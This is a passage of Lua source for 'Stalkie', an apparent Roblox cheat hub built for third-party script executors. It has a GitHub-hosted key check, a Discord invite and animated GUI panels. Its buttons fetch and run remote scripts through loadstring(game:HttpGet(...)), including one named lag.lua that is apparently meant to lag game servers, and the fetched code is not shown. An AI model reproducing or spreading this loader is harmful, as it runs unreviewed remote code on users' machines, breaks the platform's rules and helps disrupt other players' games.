        KeyFrame.Visible = true
        HubFrame.Visible = false
    elseif isHubFrameActive then
        KeyFrame.Visible = false
        HubFrame.Visible = true
    else
        KeyFrame.Visible = false
        HubFrame.Visible = false
    end

    if not KeyFrame.Parent then
        KeyFrame.Parent = ScreenGui
    end
    if not HubFrame.Parent then
        HubFrame.Parent = ScreenGui
    end
end

-- Keybind Changer Button
local KeybindButton = Instance.new("TextButton")
KeybindButton.Size = UDim2.new(0, 40, 0, 40)
KeybindButton.Position = UDim2.new(1, -100, 0, 10)
KeybindButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KeybindButton.BackgroundTransparency = 0.9
KeybindButton.Text = "V"
KeybindButton.TextColor3 = Color3.fromRGB(0, 200, 255)
KeybindButton.TextScaled = true
KeybindButton.TextSize = 20
KeybindButton.Font = Enum.Font.GothamBold
KeybindButton.ZIndex = 3
KeybindButton.TextTransparency = 1
KeybindButton.Parent = HubContent

local KeybindCorner = Instance.new("UICorner")
KeybindCorner.CornerRadius = UDim.new(0, 8)
KeybindCorner.Parent = KeybindButton

local currentKeybind = Enum.KeyCode.V
local waitingForKey = false
local guiVisible = true

local function toggleGUIs()
    if not ScreenGui then
        warn("ScreenGui is nil, cannot toggle!")
        return
    end
    if not ScreenGui.Parent then
        warn("Reparenting ScreenGui to CoreGui")
        ScreenGui.Parent = game:GetService("CoreGui")
    end
    if not validateGUI then
        warn("validateGUI function is missing!")
        return
    end
    validateGUI()
    guiVisible = not guiVisible
    local success, err = pcall(function()
        ScreenGui.Enabled = guiVisible
    end)
    if not success then
        warn("Failed to toggle GUI: " .. err)
    end
end

KeybindButton.MouseButton1Click:Connect(function()
    if not waitingForKey then
        waitingForKey = true
        KeybindButton.Text = "..."
    end
end)

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard and not gameProcessed then
        currentKeybind = input.KeyCode
        KeybindButton.Text = input.KeyCode.Name
        waitingForKey = false
    elseif not gameProcessed and input.KeyCode == currentKeybind then
        toggleGUIs()
    end
end)

-- Update Ping and Player Count
spawn(function()
    while true do
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
        PingLabel.Text = "Ping: " .. math.floor(ping) .. "ms"
        wait(1)
    end
end)

spawn(function()
    while true do
        PlayerCountLabel.Text = "Players: " .. #game.Players:GetPlayers()
        wait(1)
    end
end)

-- File handling functions
local function readFile(filename)
    return readfile(filename)
end

local function writeFile(filename, content)
    writefile(filename, content)
end

local function createFolderAndFile()
    local folderName = "Stalkie"
    local fileName = folderName .. "/key.txt"

    if not fileExists(fileName) then
        pcall(function()
            writeFile(fileName, "")
        end)
    end
    return fileName
end

-- Key System Logic
local TweenService = game:GetService("TweenService")
local showingInfo = false

local function loadHub()
    isKeyFrameActive = false
    isHubFrameActive = true
    KeyFrame.Visible = false
    HubFrame.Visible = true

    isLoadingAnimation = true

    playIntroSound()

    local blurFadeIn = TweenService:Create(BlurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 24})
    BlurEffect.Enabled = true
    blurFadeIn:Play()

    local hubFadeIn = TweenService:Create(HubBlur, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.3})
    hubFadeIn:Play()

    hubFadeIn.Completed:Wait()

    spawn(function()
        wait(0.2)

        TweenService:Create(ServerButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.9, TextTransparency = 0}):Play()
        TweenService:Create(ServerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 200, 255), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        wait(0.3)
        TweenService:Create(ServerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(0, 200, 255)}):Play()

        wait(0.2)
        TweenService:Create(ReanimButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.9, TextTransparency = 0}):Play()
        TweenService:Create(ReanimButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 200, 255), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        wait(0.3)
        TweenService:Create(ReanimButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(0, 200, 255)}):Play()

        wait(0.2)
        TweenService:Create(CopyPlayerButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.9, TextTransparency = 0}):Play()
        TweenService:Create(CopyPlayerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 200, 255), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        wait(0.3)
        TweenService:Create(CopyPlayerButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(0, 200, 255)}):Play()

        wait(0.6)
        TweenService:Create(HubTitleStalkie, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        wait(0.5)
        TweenService:Create(HubTitleHub, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(MinimizeButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(KeybindButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        wait(0.1)
        TweenService:Create(InfoButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

        wait(0.5)
        TweenService:Create(SeparatorLine, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
        wait(0.2)
        TweenService:Create(PFPBorder, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.4}):Play()
        TweenService:Create(PlayerPFP, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
        TweenService:Create(PlayerName, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(ExecutorLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(AccountAgeLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(ThankYouLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(PingLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(PlayerCountLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        TweenService:Create(RejoinButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        TweenService:Create(JoinRandomButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()

        wait(0.9)
        local blurFadeOut = TweenService:Create(BlurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 0})
        blurFadeOut:Play()
        blurFadeOut.Completed:Connect(function()
            BlurEffect.Enabled = false
            isLoadingAnimation = false
        end)
    end)
end

local function getGithubKey()
    local success, result = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/key.txt")
    end)
    if success then
        return result:match("^%s*(.-)%s*$")
    else
        warn("Failed to fetch key from GitHub: " .. result)
        return nil
    end
end

SubmitButton.MouseButton1Click:Connect(function()
    validateGUI()
    local githubKey = getGithubKey()
    local fileName = createFolderAndFile()

    if not githubKey then
        KeyInput.Text = ""
        KeyInput.PlaceholderText = "Failed to fetch key!"
        KeyInput.PlaceholderColor3 = Color3.fromRGB(255, 50, 50)
        wait(1.5)
        KeyInput.PlaceholderText = "Enter key..."
        KeyInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
        return
    end

    if KeyInput.Text == githubKey then
        pcall(function()
            writeFile(fileName, githubKey)
        end)
        loadHub()
    else
        KeyInput.Text = ""
        KeyInput.PlaceholderText = "Wrong Key!"
        KeyInput.PlaceholderColor3 = Color3.fromRGB(255, 50, 50)
        wait(1.5)
        KeyInput.PlaceholderText = "Enter key..."
        KeyInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    end
end)

GetKeyButton.MouseButton1Click:Connect(function()
    validateGUI()
    setclipboard("https://discord.gg/rY2sBJnaaQ")
    GetKeyButton.Text = "Copied!"
    GetKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    GetKeyButton.BackgroundTransparency = 0.7
    wait(1)
    GetKeyButton.Text = "Get Key"
    GetKeyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    GetKeyButton.BackgroundTransparency = 0.9
end)

local minimized = false
MinimizeButton.MouseButton1Click:Connect(function()
    validateGUI()
    local tweenService = TweenService
    local fadeInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    if not minimized then
        tweenService:Create(ServerButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(ReanimButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(CopyPlayerButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(SeparatorLine, fadeInfo, {BackgroundTransparency = 1}):Play()
        tweenService:Create(PFPBorder, fadeInfo, {BackgroundTransparency = 1}):Play()
        tweenService:Create(PlayerPFP, fadeInfo, {ImageTransparency = 1}):Play()
        tweenService:Create(PlayerName, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(ExecutorLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(AccountAgeLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(ThankYouLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(PingLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(PlayerCountLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        wait(0.3)

        HubFrame:TweenSize(UDim2.new(0, 420, 0, 60), "Out", "Sine", 0.3, true)
        ServerButton.Visible = false
        ReanimButton.Visible = false
        CopyPlayerButton.Visible = false
        SeparatorLine.Visible = false
        PlayerInfoContainer.Visible = false
        InfoContainer.Visible = false
        MinimizeButton.Text = "+"
        minimized = true
    else
        HubFrame:TweenSize(UDim2.new(0, 420, 0, 450), "Out", "Sine", 0.3, true)
        wait(0.3)

        if not showingInfo then
            ServerButton.Visible = true
            ReanimButton.Visible = true
            CopyPlayerButton.Visible = true
            SeparatorLine.Visible = true
            PlayerInfoContainer.Visible = true
            tweenService:Create(ServerButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
            tweenService:Create(ReanimButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
            tweenService:Create(CopyPlayerButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
            tweenService:Create(SeparatorLine, fadeInfo, {BackgroundTransparency = 0}):Play()
            tweenService:Create(PFPBorder, fadeInfo, {BackgroundTransparency = 0.4}):Play()
            tweenService:Create(PlayerPFP, fadeInfo, {ImageTransparency = 0}):Play()
            tweenService:Create(PlayerName, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(ExecutorLabel, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(AccountAgeLabel, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(ThankYouLabel, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(PingLabel, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(PlayerCountLabel, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
            tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        else
            InfoContainer.Visible = true
            tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 0}):Play()
            tweenService:Create(InfoText, fadeInfo, {TextTransparency = 0}):Play()
            tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
            tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 0, BackgroundTransparency = 0.9}):Play()
        end
        MinimizeButton.Text = "-"
        minimized = false
    end
end)

local function loadScript(button, url)
    validateGUI()
    button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    button.BackgroundTransparency = 0.7
    wait(0.2)

    spawn(function()
        local success, result = pcall(function()
            return loadstring(game:HttpGet(url))()
        end)
        if not success then
            warn("Error loading script: " .. result)
        end
    end)

    button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundTransparency = 0.9
end

ServerButton.MouseButton1Click:Connect(function()
    loadScript(ServerButton, "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/lag.lua")
end)

ReanimButton.MouseButton1Click:Connect(function()
    loadScript(ReanimButton, "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/reanim.lua")
end)

CopyPlayerButton.MouseButton1Click:Connect(function()
    loadScript(CopyPlayerButton, "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/misc.lua")
end)

InfoButton.MouseButton1Click:Connect(function()
    validateGUI()
    local tweenService = TweenService
    local fadeInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    if minimized then
        HubFrame:TweenSize(UDim2.new(0, 420, 0, 450), "Out", "Sine", 0.3, true)
        wait(0.3)
        MinimizeButton.Text = "-"
        minimized = false

        ServerButton.Visible = false
        ReanimButton.Visible = false
        CopyPlayerButton.Visible = false
        SeparatorLine.Visible = false
        PlayerInfoContainer.Visible = false

        InfoContainer.Visible = true
        tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 0}):Play()
        tweenService:Create(InfoText, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 0, BackgroundTransparency = 0.9}):Play()

        showingInfo = true
    elseif not showingInfo then
        tweenService:Create(ServerButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(ReanimButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(CopyPlayerButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(SeparatorLine, fadeInfo, {BackgroundTransparency = 1}):Play()
        tweenService:Create(PFPBorder, fadeInfo, {BackgroundTransparency = 1}):Play()
        tweenService:Create(PlayerPFP, fadeInfo, {ImageTransparency = 1}):Play()
        tweenService:Create(PlayerName, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(ExecutorLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(AccountAgeLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(ThankYouLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(PingLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(PlayerCountLabel, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()

        wait(0.3)
        ServerButton.Visible = false
        ReanimButton.Visible = false
        CopyPlayerButton.Visible = false
        SeparatorLine.Visible = false
        PlayerInfoContainer.Visible = false

        InfoContainer.Visible = true
        tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 0}):Play()
        tweenService:Create(InfoText, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 0, BackgroundTransparency = 0.9}):Play()

        showingInfo = true
    else
        tweenService:Create(StalkieIcon, fadeInfo, {ImageTransparency = 1}):Play()
        tweenService:Create(InfoText, fadeInfo, {TextTransparency = 1}):Play()
        tweenService:Create(DiscordButton, fadeInfo, {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        tweenService:Create(YouTubeButton, fadeInfo, {ImageTransparency = 1, BackgroundTransparency = 1}):Play()

        wait(0.3)
        InfoContainer.Visible = false

        ServerButton.Visible = true
        ReanimButton.Visible = true
        CopyPlayerButton.Visible = true
        SeparatorLine.Visible = true
        PlayerInfoContainer.Visible = true
        tweenService:Create(ServerButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        tweenService:Create(ReanimButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        tweenService:Create(CopyPlayerButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        tweenService:Create(SeparatorLine, fadeInfo, {BackgroundTransparency = 0}):Play()
        tweenService:Create(PFPBorder, fadeInfo, {BackgroundTransparency = 1}):Play()
        tweenService:Create(PlayerPFP, fadeInfo, {ImageTransparency = 0}):Play()
        tweenService:Create(PlayerName, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(ExecutorLabel, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(AccountAgeLabel, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(ThankYouLabel, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(PingLabel, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(PlayerCountLabel, fadeInfo, {TextTransparency = 0}):Play()
        tweenService:Create(RejoinButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()
        tweenService:Create(JoinRandomButton, fadeInfo, {TextTransparency = 0, BackgroundTransparency = 0.9}):Play()

        showingInfo = false
    end
end)

DiscordButton.MouseButton1Click:Connect(function()
    validateGUI()
    setclipboard("https://discord.gg/rY2sBJnaaQ")
    DiscordButton.Text = "Copied!"
    DiscordButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    DiscordButton.BackgroundTransparency = 0.7
    wait(1)
    DiscordButton.Text = "Join Discord"
    DiscordButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    DiscordButton.BackgroundTransparency = 0.9
end)

YouTubeButton.MouseButton1Click:Connect(function()
    validateGUI()
    setclipboard("https://www.youtube.com/@0riginalWarrior5")
    YouTubeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    YouTubeButton.BackgroundTransparency = 0.7
    wait(1)
    YouTubeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    YouTubeButton.BackgroundTransparency = 0.9
end)

local function addHover(button)
    local originalColor = button.BackgroundColor3
    local tweenService = game:GetService("TweenService")
    local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)

    button.MouseEnter:Connect(function()
        if isLoadingAnimation then return end
        validateGUI()
        tweenService:Create(button, hoverInfo, {
            BackgroundColor3 = Color3.fromRGB(0, 150, 255),
            BackgroundTransparency = 0.7
        }):Play()
        if button:IsA("TextButton") then
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)

    button.MouseLeave:Connect(function()
        if isLoadingAnimation then return end
        validateGUI()
        tweenService:Create(button, hoverInfo, {
            BackgroundColor3 = originalColor,
            BackgroundTransparency = 0.9
        }):Play()
        if button:IsA("TextButton") then
            button.TextColor3 = Color3.fromRGB(0, 200, 255)
        end
    end)
end

addHover(ServerButton)
addHover(ReanimButton)
addHover(CopyPlayerButton)
addHover(SubmitButton)
addHover(GetKeyButton)
addHover(MinimizeButton)
addHover(InfoButton)
addHover(DiscordButton)
addHover(RejoinButton)
addHover(JoinRandomButton)
addHover(KeybindButton)
addHover(YouTubeButton)

local function checkKey()
    local fileName = createFolderAndFile()
    local githubKey = getGithubKey()

    -- Attempt to fetch assets, but don't halt execution on failure
    pcall(function()
        if not fileExists(iconFilePath) then
            fetchAndSaveIcon()
        end
        if not fileExists(youtubeFilePath) then
            fetchAndSaveYouTubeIcon()
        end
    end)

    KeyFrame.Visible = false
    HubFrame.Visible = false

    if not githubKey then
        isKeyFrameActive = true
        isHubFrameActive = false
        KeyFrame.Visible = true
        return false
    end

    local success, fileContent = fileExists(fileName)
    if success then
        local storedKey = readFile(fileName)
        if storedKey == githubKey then
            loadHub()
            return true
        end
    end

    isKeyFrameActive = true
    isHubFrameActive = false
    KeyFrame.Visible = true
    return false
end

spawn(function()
    while true do
        validateGUI()
        wait(0.1)
    end
end)

checkKey()
